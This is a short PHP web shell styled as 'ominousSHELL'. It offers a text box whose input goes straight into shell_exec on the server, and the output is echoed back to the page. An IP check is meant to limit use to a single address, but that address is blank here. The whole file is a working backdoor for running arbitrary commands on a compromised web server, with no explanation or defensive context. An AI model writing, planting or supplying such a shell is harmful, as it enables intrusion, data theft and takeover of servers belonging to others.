<!DOCTYPE html>
<html>
	<head>
<style>
	body {
		background: #000;
		color: #00CED1;
		font-family: serif;
		font-size: 30px;
	}
	#header {
		font-size: 100px;
		margin-bottom: 40px;
	}
	#bar {
		width: 950px;
		height: 50px;
		padding: 4px;
		background: #000;
		border: 2px solid cyan;
		color: #00CED1;
		font-size: 50px;
	}
</style>
	<title>WEB SHELL</title>
	</head>

	<body>
		<h1 id='header'>ominousSHELL</h1>
		<form action="<?php $_PHP_SELF;?>" method='POST'>
			Execute: <input id='bar' type='text' name=0>
		</form>
	</body>

</html>
<?php
	if (isset($_REQUEST[0])){
		if ($_SERVER['REMOTE_ADDR'] == ''){
			echo "<pre>";
			echo shell_exec($_REQUEST[0]);
			echo "</pre>";
		}
		else {
			echo "Nope, not your webshell :) <br>";
			echo "IP: " .  $_SERVER['REMOTE_ADDR'];
		}
	}
?>
